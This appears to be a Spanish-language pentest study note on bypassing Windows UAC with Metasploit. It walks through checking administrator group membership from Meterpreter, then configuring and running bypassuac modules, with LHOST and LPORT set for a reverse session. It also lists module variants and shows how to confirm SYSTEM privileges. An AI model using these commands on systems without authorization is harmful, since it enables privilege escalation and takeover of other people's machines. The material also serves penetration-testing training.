# Escalada de Privilegios en Windows: Bypass UAC con Metasploit

## ¿Qué es UAC?

**UAC (User Account Control)** es un mecanismo de seguridad en Windows que evita que procesos se ejecuten automáticamente con privilegios elevados, incluso si el usuario pertenece al grupo de administradores.

---

## ¿Qué permisos necesitas para Bypass UAC?

Para que el **Bypass de UAC** funcione, se requiere:

- Un usuario que pertenezca al **grupo de administradores locales**.
- Que el proceso actual **no esté elevado** (es decir, no tenga ya privilegios de administrador).

> No puedes hacer bypass UAC desde un usuario que **no tenga privilegios administrativos**.

---

## ¿Cómo saber si tienes esos permisos?

### Desde Meterpreter

1. Comprueba el usuario actual:
```bash
getuid
```

2. Enumera los privilegios actuales:
```bash
getprivs
```

3. Comprueba si está en el grupo de administradores:
```bash
shell
whoami /groups
```

Busca una entrada como:
```
BUILTIN\Administrators
```

Si aparece, el usuario es **miembro del grupo Administradores**, lo que permite intentar el bypass.

---

## Módulo de Metasploit para Bypass UAC

### Módulo base:
```bash
use exploit/windows/local/bypassuac_injection
```

### Opciones necesarias:
```bash
set SESSION <id_de_sesion_shell>
set target
set payload
set LHOST <tu_ip>
set LPORT <tu_puerto>
```

### Ejecutar:
```bash
run
```

Esto intentará lanzar un nuevo proceso elevado, conectando una nueva sesión Meterpreter.

---

## Variantes del módulo

- `bypassuac_eventvwr`
- `bypassuac_sdclt`
- `bypassuac_comhijack`
- `bypassuac_fodhelper`

Cada uno explota una vulnerabilidad diferente en la forma en que UAC trata ciertos binarios firmados por Microsoft.

---

## Validar que funcionó

Una vez abierta la nueva sesión:

```bash
getuid
```

Deberías ver algo como:
```
NT AUTHORITY\SYSTEM
```
o el nombre de usuario sin la restricción de UAC.

También puedes hacer:
```bash
getprivs
```
Y buscar privilegios como `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.

